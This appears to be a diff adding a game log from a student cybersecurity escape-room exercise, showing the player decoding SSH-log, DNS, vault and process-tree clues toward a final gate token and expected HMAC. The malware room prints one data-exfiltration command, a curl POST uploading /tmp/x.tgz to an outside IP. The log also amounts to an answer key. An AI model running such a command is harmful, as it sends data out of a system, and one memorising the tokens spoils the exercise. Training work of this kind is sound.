@@ -1,0 +1,59 @@
+07/11/25 13:39:16 - Welcome to the escape room game
+07/11/25 13:39:16 - 
+            ___________                                    __________                                                             
+            \_   _____/ ______ ____ _____  ______   ____   \______   \ ____   ____   _____                                        
+             |    __)_ /  ___// ___\\__  \ \____ \_/ __ \   |       _//  _ \ /  _ \ /     \                                       
+             |        \\___ \\  \___ / __ \|  |_> >  ___/   |    |   (  <_> |  <_> )  Y Y  \
+            /_______  /____  >\___  >____  /   __/ \___  >  |____|_  /\____/ \____/|__|_|  /                                      
+                    \/     \/     \/     \/|__|        \/          \/                    \/                                       
+                
+07/11/25 13:39:16 - Enjoy the escape room!
+07/11/25 13:39:16 - Type quit to quit
+07/11/25 13:39:16 - Type hint for assistance
+07/11/25 13:39:16 - User called move soc
+07/11/25 13:39:16 - You have entered into CurrentRoom.SOC
+07/11/25 13:39:16 - User called inspect auth.log
+07/11/25 13:39:16 - SOC: TOKEN[KEYPAD]=16265
+07/11/25 13:39:16 - SOC: EVIDENCE[KEYPAD].TOP24=198.18.0.0/24
+07/11/25 13:39:16 - SOC: EVIDENCE[KEYPAD].COUNT=65
+07/11/25 13:39:16 - SOC: EVIDENCE[KEYPAD].SAMPLE=2025-08-09T12:00:23Z lab1 sshd[2273]: Failed password for svc from 198.18.0.253 port 48014 protocol 2
+07/11/25 13:39:16 - SOC: EVIDENCE[KEYPAD].MALFORMED_SKIPPED=2
+07/11/25 13:39:16 - User called move dns
+07/11/25 13:39:16 - You have entered into CurrentRoom.DNS
+07/11/25 13:39:16 - User called inspect dns.cfg
+07/11/25 13:39:16 - [DNSRoom] starting decode
+07/11/25 13:39:16 - Base64 decode error: Incorrect padding
+07/11/25 13:39:16 - Base64 decode error: Incorrect padding
+07/11/25 13:39:16 - [Room DNS] Decoding hints...
+07/11/25 13:39:16 - Decoded line: "Signals converge in the anchor if you read between lines."
+07/11/25 13:39:16 - Token formed: lines
+07/11/25 13:39:16 - DNS: TOKEN[DNS]=lines
+07/11/25 13:39:16 - DNS: EVIDENCE[DNS].KEY=hint3
+07/11/25 13:39:16 - DNS: EVIDENCE[DNS].DECODED_LINE=Signals converge in the anchor if you read between lines.
+07/11/25 13:39:16 - User called move vault
+07/11/25 13:39:16 - You have entered into CurrentRoom.VAULT
+07/11/25 13:39:16 - User called inspect vault_dump.txt
+07/11/25 13:39:16 - The values 
+SAFE{18-8-26}
+ are valid
+07/11/25 13:39:16 - The results of vault are: {'\nSAFE{18-8-26}\n': ('18', '8', '26')}
+07/11/25 13:39:16 - Vault: TOKEN[SAFE]=18-8-26
+07/11/25 13:39:16 - Vault: EVIDENCE[SAFE].MATCH=SAFE{18-8-26}
+07/11/25 13:39:16 - Vault: EVIDENCE[SAFE].CHECK=18+8=26
+07/11/25 13:39:16 - Returning token: 18-8-26
+07/11/25 13:39:16 - User called move malware
+07/11/25 13:39:16 - You have entered into CurrentRoom.MALWARE
+07/11/25 13:39:16 - User called inspect proc_tree.jsonl
+07/11/25 13:39:16 - [MalwareRoom] Starting traversal
+07/11/25 13:39:16 - [Room MALWARE] Found exfil path: [211->214->215->219]
+07/11/25 13:39:16 - [Room MALWARE] Matched command: "sh -c 'curl -X POST http://198.51.100.33/upload -d @/tmp/x.tgz'"
+07/11/25 13:39:16 - Malware: TOKEN[PID]=219
+07/11/25 13:39:16 - Malware: EVIDENCE[PID].PATH=[211->214->215->219]
+07/11/25 13:39:16 - Malware: EVIDENCE[PID].CMD="sh -c 'curl -X POST http://198.51.100.33/upload -d @/tmp/x.tgz'"
+07/11/25 13:39:16 - User called move gate
+07/11/25 13:39:16 - You have entered into CurrentRoom.FINAL_GATE
+07/11/25 13:39:16 - User called use final_gate
+07/11/25 13:39:16 - Final gate was opened with: FINAL_GATE=PENDING
+MSG=msc-group-07|lines-16265-219-18-8-26
+EXPECTED_HMAC=c719a21479a756ff780b7e63fc2dd969f46b795e09aa940fbc5a376352f59241
+07/11/25 13:39:16 - Thank you for playing
